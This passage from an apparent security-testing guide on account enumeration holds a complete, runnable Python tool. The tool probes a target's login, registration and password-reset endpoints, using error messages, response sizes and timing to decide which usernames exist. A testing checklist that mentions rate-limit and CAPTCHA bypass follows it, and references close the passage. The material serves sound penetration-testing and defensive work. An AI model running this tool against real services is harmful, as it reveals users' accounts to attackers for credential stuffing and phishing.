        invalid_user = "definitely_nonexistent_user_xyz123@fake.com"

        async with aiohttp.ClientSession() as session:
            # Login baseline
            if EnumerationMethod.LOGIN in self.config.methods:
                url = f"{self.config.target_base_url}{self.config.login_endpoint}"
                start = time.time()
                async with session.post(url, json={
                    self.config.username_field: invalid_user,
                    self.config.password_field: "test"
                }) as resp:
                    self.baseline["login"] = {
                        "status": resp.status,
                        "length": len(await resp.text()),
                        "time": time.time() - start
                    }

            # Registration baseline
            if EnumerationMethod.REGISTRATION in self.config.methods:
                url = f"{self.config.target_base_url}{self.config.register_endpoint}"
                start = time.time()
                async with session.post(url, json={
                    self.config.username_field: invalid_user,
                    self.config.password_field: "TestPass123!"
                }) as resp:
                    self.baseline["registration"] = {
                        "status": resp.status,
                        "length": len(await resp.text()),
                        "time": time.time() - start
                    }

            # Password reset baseline
            if EnumerationMethod.PASSWORD_RESET in self.config.methods:
                url = f"{self.config.target_base_url}{self.config.reset_endpoint}"
                start = time.time()
                async with session.post(url, json={
                    self.config.username_field: invalid_user
                }) as resp:
                    self.baseline["reset"] = {
                        "status": resp.status,
                        "length": len(await resp.text()),
                        "time": time.time() - start
                    }

        print(f"[*] Baselines established: {list(self.baseline.keys())}")

    async def _check_username(self, session: aiohttp.ClientSession, username: str) -> EnumerationFinding:
        """Check single username across all methods"""
        indicators = []
        max_confidence = 0.0
        best_method = None
        timing = None
        response_size = None

        # Login check
        if EnumerationMethod.LOGIN in self.config.methods:
            result = await self._check_login(session, username)
            if result["confidence"] > max_confidence:
                max_confidence = result["confidence"]
                best_method = "login"
                indicators = result["indicators"]
                timing = result.get("timing")
                response_size = result.get("size")

        # Registration check
        if EnumerationMethod.REGISTRATION in self.config.methods:
            result = await self._check_registration(session, username)
            if result["confidence"] > max_confidence:
                max_confidence = result["confidence"]
                best_method = "registration"
                indicators = result["indicators"]

        # Password reset check
        if EnumerationMethod.PASSWORD_RESET in self.config.methods:
            result = await self._check_reset(session, username)
            if result["confidence"] > max_confidence:
                max_confidence = result["confidence"]
                best_method = "password_reset"
                indicators = result["indicators"]
                timing = result.get("timing")

        await asyncio.sleep(self.config.delay)

        return EnumerationFinding(
            username=username,
            exists=max_confidence > 0.5,
            confidence=max_confidence,
            method=best_method or "none",
            indicators=indicators,
            timing=timing,
            response_size=response_size
        )

    async def _check_login(self, session: aiohttp.ClientSession, username: str) -> Dict:
        """Check via login endpoint"""
        url = f"{self.config.target_base_url}{self.config.login_endpoint}"
        indicators = []
        confidence = 0.0

        try:
            start = time.time()
            async with session.post(
                url,
                json={self.config.username_field: username, self.config.password_field: "test"},
                timeout=aiohttp.ClientTimeout(total=self.config.timeout)
            ) as resp:
                elapsed = time.time() - start
                text = await resp.text()
                size = len(text)

                baseline = self.baseline.get("login", {})

                # Check for user-specific error messages
                if any(x in text.lower() for x in ["incorrect password", "wrong password", "account locked"]):
                    indicators.append("User-specific error message")
                    confidence += 0.7

                # Check response size difference
                if baseline and abs(size - baseline["length"]) > 20:
                    indicators.append(f"Response size differs: {size} vs {baseline['length']}")
                    confidence += 0.2

                # Check timing difference
                if baseline and (elapsed - baseline["time"]) > 0.2:
                    indicators.append(f"Response time differs: {elapsed:.3f}s vs {baseline['time']:.3f}s")
                    confidence += 0.3

                return {
                    "confidence": min(confidence, 1.0),
                    "indicators": indicators,
                    "timing": elapsed,
                    "size": size
                }

        except Exception as e:
            return {"confidence": 0, "indicators": [f"Error: {str(e)}"]}

    async def _check_registration(self, session: aiohttp.ClientSession, username: str) -> Dict:
        """Check via registration endpoint"""
        url = f"{self.config.target_base_url}{self.config.register_endpoint}"
        indicators = []
        confidence = 0.0

        try:
            async with session.post(
                url,
                json={
                    self.config.username_field: username,
                    self.config.password_field: "TestPass123!"
                },
                timeout=aiohttp.ClientTimeout(total=self.config.timeout)
            ) as resp:
                text = await resp.text()

                if any(x in text.lower() for x in ["already", "exists", "taken", "registered"]):
                    indicators.append("Email already registered message")
                    confidence += 0.9

                return {"confidence": min(confidence, 1.0), "indicators": indicators}

        except Exception as e:
            return {"confidence": 0, "indicators": [f"Error: {str(e)}"]}

    async def _check_reset(self, session: aiohttp.ClientSession, username: str) -> Dict:
        """Check via password reset endpoint"""
        url = f"{self.config.target_base_url}{self.config.reset_endpoint}"
        indicators = []
        confidence = 0.0

        try:
            start = time.time()
            async with session.post(
                url,
                json={self.config.username_field: username},
                timeout=aiohttp.ClientTimeout(total=self.config.timeout)
            ) as resp:
                elapsed = time.time() - start
                text = await resp.text()

                baseline = self.baseline.get("reset", {})

                # Check for positive messages
                if any(x in text.lower() for x in ["sent", "check your email", "reset link"]):
                    indicators.append("Reset email sent message")
                    confidence += 0.6

                # Check timing (email sending takes time)
                if baseline and (elapsed - baseline["time"]) > 0.5:
                    indicators.append(f"Longer response time (email sent?): {elapsed:.3f}s")
                    confidence += 0.4

                return {
                    "confidence": min(confidence, 1.0),
                    "indicators": indicators,
                    "timing": elapsed
                }

        except Exception as e:
            return {"confidence": 0, "indicators": [f"Error: {str(e)}"]}

    def generate_report(self) -> str:
        """Generate enumeration report"""
        report = "# User Enumeration Report\n\n"
        report += f"Target: {self.config.target_base_url}\n"
        report += f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"

        found = [f for f in self.findings if f.exists]
        report += f"## Summary\n\n"
        report += f"- Total tested: {len(self.findings)}\n"
        report += f"- Users found: {len(found)}\n\n"

        if found:
            report += "## Found Users\n\n"
            for finding in sorted(found, key=lambda x: x.confidence, reverse=True):
                report += f"### {finding.username}\n"
                report += f"- Confidence: {finding.confidence:.2f}\n"
                report += f"- Method: {finding.method}\n"
                report += f"- Indicators:\n"
                for indicator in finding.indicators:
                    report += f"  - {indicator}\n"
                report += "\n"

        return report

# CLI interface
def main():
    parser = argparse.ArgumentParser(description="User Enumeration Framework")
    parser.add_argument("target", help="Target base URL")
    parser.add_argument("-u", "--usernames", help="File containing usernames", required=True)
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("-d", "--delay", type=float, default=0.5, help="Delay between requests")
    parser.add_argument("-o", "--output", help="Output file for report")

    args = parser.parse_args()

    # Load usernames
    with open(args.usernames) as f:
        usernames = [line.strip() for line in f if line.strip()]

    config = EnumerationConfig(
        target_base_url=args.target,
        threads=args.threads,
        delay=args.delay
    )

    framework = EnumerationFramework(config)

    # Run enumeration
    asyncio.run(framework.run_enumeration(usernames))

    # Generate report
    report = framework.generate_report()
    print("\n" + report)

    if args.output:
        with open(args.output, "w") as f:
            f.write(report)
        print(f"[*] Report saved to {args.output}")

if __name__ == "__main__":
    main()
```

---

## 5. Prevention Testing Checklist

```markdown
## Account Enumeration Security Testing Checklist

### Login Endpoint
- [ ] Test error message differences for valid/invalid users
- [ ] Measure response time differences
- [ ] Compare response sizes
- [ ] Check status code differences
- [ ] Test with known valid user
- [ ] Test rate limiting effectiveness

### Registration Endpoint
- [ ] Check "email already exists" messages
- [ ] Test username availability check
- [ ] Test AJAX validation endpoints
- [ ] Check for timing differences

### Password Reset
- [ ] Test response differences for valid/invalid emails
- [ ] Measure email sending timing
- [ ] Check response messages
- [ ] Test rate limiting

### API Endpoints
- [ ] Test user ID enumeration
- [ ] Check username lookup endpoints
- [ ] Test search functionality
- [ ] Check GraphQL queries

### Bypass Testing
- [ ] Test rate limit bypass techniques
- [ ] Test CAPTCHA bypass
- [ ] Test with distributed requests
- [ ] Test header manipulation

### Timing Analysis
- [ ] High-precision timing measurements
- [ ] Network noise filtering
- [ ] Statistical significance testing
- [ ] Password complexity timing
```

---

## References

- OWASP Testing Guide - Testing for Account Enumeration
- PortSwigger Web Security Academy - Authentication Vulnerabilities
- NIST Digital Identity Guidelines (SP 800-63B)
- CWE-203: Observable Discrepancy
- CWE-204: Observable Response Discrepancy
- HackerOne Disclosed Reports - User Enumeration
